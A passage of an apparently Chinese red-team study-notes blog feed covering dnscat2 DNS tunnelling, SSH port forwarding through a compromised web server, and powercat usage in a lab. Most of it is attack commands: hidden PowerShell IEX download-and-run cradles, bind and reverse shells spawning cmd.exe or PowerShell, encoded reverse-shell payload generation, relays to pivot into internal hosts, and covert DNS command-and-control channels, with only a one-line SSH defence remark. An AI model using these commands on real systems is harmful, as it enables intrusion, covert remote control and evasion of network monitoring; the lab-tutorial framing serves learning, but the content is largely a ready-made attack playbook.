apt-get install ruby-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h2><p>dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 <code>make install</code> 进行编译。</p><p>Linux 下可以通过以下方法进行编译</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.gitcd dnscat2&#x2F;client&#x2F;make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Windows 可以直接下载已经编译好的版本</p><p>exe 版（解压密码：password）：<a href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p><p>PowerShell 版：<a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p><p>如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。</p><pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者下载 ps1 文件后，使用以下命令导入</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\dnscat2.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、直连模式"><a href="#1、直连模式" class="headerlink" title="1、直连模式"></a>1、直连模式</h2><p><strong>启动服务端</strong>，这里服务端 IP 为 172.16.214.50</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;dnscat2&#x2F;serversudo ruby .&#x2F;dnscat2.rb -s 553 -c teamssix --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-s 指定 dns 服务端口-c 指定连接密码--no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>启动客户端</strong>，这里以 Windows 下的 exe 版为例</p><pre class="line-numbers language-none"><code class="language-none">dnscat --dns server&#x3D;172.16.214.50,port&#x3D;553 --secret&#x3D;teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功后，会提示 <code>Session established!</code></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>dnscat2 的一些命令</p><pre class="line-numbers language-none"><code class="language-none">sessions 或 windows 查看当前会话session -i 1 或 window -i 1 进入 ID 为 1 的会话shell 建立交互式会话exec远程打开程序download  下载文件help查看支持的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>抓下包，看看流量是什么样子的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>不难看出，流量中有很多 dnscat 的字样，这样一来，虽然使用了 dns 协议，但是隐蔽性还是差了不少，接下来看看中继模式。</p><h2 id="2、中继模式"><a href="#2、中继模式" class="headerlink" title="2、中继模式"></a>2、中继模式</h2><p>在中继模式下，需要自己有一个域名，并添加两条域名解析记录。</p><p>首先创建一条 A 记录指向自己的公网 VPS 地址，之后创建一条 ns 记录指向 A 记录的子域名，示例如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p><p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p><pre class="line-numbers language-none"><code class="language-none">nslookup ns1.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p><pre class="line-numbers language-none"><code class="language-none">sudo tcpdump -n -i eth0 udp dst port 53<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>开启服务端</strong></p><pre class="line-numbers language-none"><code class="language-none">sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-e 指定安全级别，open 表示服务端允许客户端不进行加密<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示<code>Address already in use - bind(2) for &quot;0.0.0.0&quot; port 53</code>，可以关闭<code>systemd-resolved</code></p><pre class="line-numbers language-none"><code class="language-none">sudo systemctl stop systemd-resolved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开启客户端</strong>，这里以 Windows 下的 PowerShell 版为例</p><pre class="line-numbers language-none"><code class="language-none">start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以把导入的命令和开启客户端的命令放在一起</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再来抓下包，看看流量是什么样的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看出，流量中已经没有了 dnscat 的字样，这也是为什么在介绍部分说中继模式比直连模式更安全的原因。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2214">https://xz.aliyun.com/t/2214</a></p><p><a href="https://blog.csdn.net/localhost01/article/details/86591685">https://blog.csdn.net/localhost01/article/details/86591685</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/104429983">https://blog.csdn.net/qq_36119192/article/details/104429983</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】SSH 隧道使用学习</title>
      <link href="//210604-154036.html"/>
      <url>//210604-154036.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>SSH 全称 <code>Secure Shell</code>，从它的名字来看这个协议就比较安全。SSH 协议是一种应用层协议，支持几乎所有 UNIX、Linux 平台。</p><p>得益于 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量。</p><p>因此在内网渗透过程中，使用 SSH 协议进行建立隧道的方法，一方面不用自己再上传同类工具，另一方面降低了因上传使用了同类工具被管理员发现的风险。</p><h1 id="0x01-SSH-常用命令介绍"><a href="#0x01-SSH-常用命令介绍" class="headerlink" title="0x01 SSH 常用命令介绍"></a>0x01 SSH 常用命令介绍</h1><p>相信各位平时最常使用的 SSH 命令就是拿来连接 Linux 系统了，命令一般是这样：</p><pre class="line-numbers language-none"><code class="language-none">ssh root@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者 -p 指定自己自定义的 SSH 端口、-i 指定自己的私钥文件等等。</p><p>如果拿 SSH 来创建隧道则需要用到下面的命令：</p><pre class="line-numbers language-none"><code class="language-none">-C 压缩传输，提高传输速度。-f 将 SSH 传输转入后台执行，不占用当前 shell-N 建立静默连接（建立了连接但看不到具体会话）-g 允许远程主机连接本地用于转发的端口。-L 本地端口转发-R 远程端口转发-D 动态转发（ SOCKS 代理）-p 指定 SSH 端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-本地转发"><a href="#0x02-本地转发" class="headerlink" title="0x02 本地转发"></a>0x02 本地转发</h1><p>目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。</p><p>环境拓扑如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上</p><pre class="line-numbers language-none"><code class="language-none">ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-#" data-language="#"><div class="caption"><span>ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5</span></div><code class="language-#">&gt; ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5root@172.16.214.5&#39;s password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这条命令的意思就是将 Web 服务器 172.16.214.5 作为跳板，将内网办公主机的 3389 端口转发到攻击主机的 3388 端口，这样只要访问攻击主机的 3388 端口就会访问到内网办公主机的 3389 端口了。</p><p>为了判断代理转发是否建立成功，可以通过 <code>netstat</code> 进行判断</p><pre class="line-numbers language-none"><code class="language-none">netstat -pantu | grep &quot;3388&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-netstat" data-language="netstat"><div class="caption"><span>-pantu | grep "3388"</span></div><code class="language-netstat">&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 0.0.0.0:3388            0.0.0.0:*               LISTEN      14086&#x2F;sshtcp6       0      0 :::3388                 :::*                    LISTEN      14086&#x2F;ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到 ssh 程序已经监听 3388 端口了，接下来连接本地的 3388 端口就可以连接到内网办公主机的 3389 端口了</p><pre class="line-numbers language-none"><code class="language-none">rdesktop 127.0.0.1:3388<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-远程转发"><a href="#0x03-远程转发" class="headerlink" title="0x03 远程转发"></a>0x03 远程转发</h1><p>远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。</p><p>因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh3.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>将 Web 服务器作为跳板，进行远程转发</p><pre class="line-numbers language-none"><code class="language-none">ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48root@172.16.214.48&#39;s password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同样的，为了判断代理转发是否建立成功，也可以通过 <code>netstat</code> 进行判断，和之前一样都是在攻击主机下执行下面的命令</p><pre class="line-numbers language-none"><code class="language-none">netstat -pantu | grep &quot;3388&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; netstat -pantu | grep &quot;3388&quot;tcp        0      0 127.0.0.1:3388          0.0.0.0:*               LISTEN      24728&#x2F;sshd: roottcp6       0      0 ::1:3388                :::*                    LISTEN      24728&#x2F;sshd: root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到，同样的，在攻击主机上 3388 端口的监听已经被开启了，此时直接在攻击主机上访问 127.0.0.1:3388 就可以连接到 192.168.7.110:3389 了</p><pre class="line-numbers language-none"><code class="language-none">rdesktop 127.0.0.1:3388<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x04-动态转发"><a href="#0x04-动态转发" class="headerlink" title="0x04 动态转发"></a>0x04 动态转发</h1><p>动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh1.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在攻击主机上执行下面的命令</p><pre class="line-numbers language-none"><code class="language-none">ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; ssh -CfNg -D 4444 root@172.16.214.5root@172.16.214.5&#39;s password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用 <code>netstat</code> 可以看到现在 4444 端口已经被监听了</p><pre class="line-numbers language-none"><code class="language-none">netstat -pantu | grep &quot;4444&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; netstat -pantu | grep &quot;4444&quot;tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3979&#x2F;sshtcp6       0      0 :::4444                 :::*                    LISTEN      3979&#x2F;ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>动态转发其实就是建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问，例如这里以 proxychains 为例，借助 proxychains 从攻击主机访问到内网的办公主机的 3389 端口。</p><p>在 kali 上如果没有自带 proxychains，可以直接使用 <code>sudo apt install proxychains</code> 进行安装，安装完成后，需要修改 proxychains 的配置文件</p><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来到配置文件最后一行，如果有之前配置好的代理，可以用 # 号注释掉，然后另起一行添加上我们的代理，添加内容为：</p><pre class="line-numbers language-none"><code class="language-none">socks5 127.0.0.1 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改后之后，按下<code>esc</code>，然后按下<code>:wq</code> 保存退出</p><p>之后使用下面的命令连接内网办公主机 192.168.7.110 的 3389 端口。</p><pre class="line-numbers language-none"><code class="language-none">proxychains4 rdesktop 192.168.7.110:3389 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ssh4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制。</p><h1 id="0x05-SSH-隧道攻击的防御"><a href="#0x05-SSH-隧道攻击的防御" class="headerlink" title="0x05 SSH 隧道攻击的防御"></a>0x05 SSH 隧道攻击的防御</h1><p>对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。</p><blockquote><p>参考文章：</p><p><a href="https://baike.baidu.com/item/SSH/10407">https://baike.baidu.com/item/SSH/10407</a></p><p><a href="https://zhuanlan.zhihu.com/p/174782978">https://zhuanlan.zhihu.com/p/174782978</a><br>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】8、powercat 的使用</title>
      <link href="//210601-155103.html"/>
      <url>//210601-155103.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\powercat.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre class="line-numbers language-none"><code class="language-none">-l监听模式-p指定监听端口-e指定启动进程的名称-v显示详情-c指定想要连接的 IP 地址-ep返回 powershell-dns使用 dns 通信-g生成 payload-ge生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre class="line-numbers language-none"><code class="language-none">nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.21 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机开启监听，等待 Kali 连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机向 kali 发起连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.46 -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre class="line-numbers language-none"><code class="language-none">kali172.16.214.47windows7172.16.214.2windows10172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 win7 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 5555 -r tcp:172.16.214.21:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后在 kali 下连接 win7</p><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -e cmd -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -ge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机上执行刚生成的 payload</p><pre class="line-numbers language-none"><code class="language-none">powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.gitcd dnscat2&#x2F;server&#x2F;gem install bundlerbundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre class="line-numbers language-none"><code class="language-none">ruby dnscat2.rb powercat -e open --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre class="line-numbers language-none"><code class="language-none">sessions#查看所有会话session -i 1 #选择指定的会话进行交互<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a></p><p><a href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
